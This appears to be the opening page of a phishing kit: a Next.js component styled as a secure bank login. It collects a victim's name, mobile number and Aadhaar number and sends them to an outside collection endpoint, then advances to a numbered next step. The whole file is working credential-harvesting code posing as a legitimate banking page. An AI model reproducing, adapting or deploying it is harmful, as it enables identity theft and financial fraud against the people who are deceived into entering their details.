'use client';
import DateInputComponent from "./inlcude/DateInputComponent";
import Footer from "./inlcude/footer";
import Header from "./inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect } from "react";  


export default function Home() {
    const router = useRouter();
    const API_URL = "https://sallu.info/api/form/add";

    useEffect(()=>{
        localStorage.removeItem('collection_id');
    })
    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = "localhost";
        console.log(jsonObject1);
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            localStorage.setItem('collection_id', responseData.data);
            router.push('/2');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
  return (
    <>
    <Header />
    
    <div className="bg-danger text-white    text-center">
        <small>All YOUR BANKING FROM A SINGLE SECURE LOGIN</small>
    </div>
    <div className="bg-primary" style={{marginTop:"25px"}} >
        <form onSubmit={handleSubmit} className="mt-3 py-2">
            <div className="form-group mb-4">
                <label htmlFor="">Name* </label>
                <input name="nm" type="text" className="form-control"    required/>
            </div>
            <div className="form-group mb-4">
                <label htmlFor="MNo">Mobile Number* </label>
                <input name="MNo" type="text" inputMode="numeric" className="form-control"  size={30} required="" maxLength={10} aria-label="/MNo" required/>
            </div>
            <div className="form-group mb-4">
                <label htmlFor="">Aadhaar Number* </label>
                <input name="adn" type="text" inputMode="numeric" className="form-control"  size={12} maxLength={12}  required/>
            </div>

            <div className="d-flex text-center mb-4 form-group justify-content-center ">
                <input type="submit" className="btn btn-light px-4 text-primary mt-2" defaultValue="Login" />
            </div>
        </form>
    </div>

    <img src="/assets/footer.png" width="100%" style={{marginTop:"25px"}} />

    <Footer />
</>
  );
}
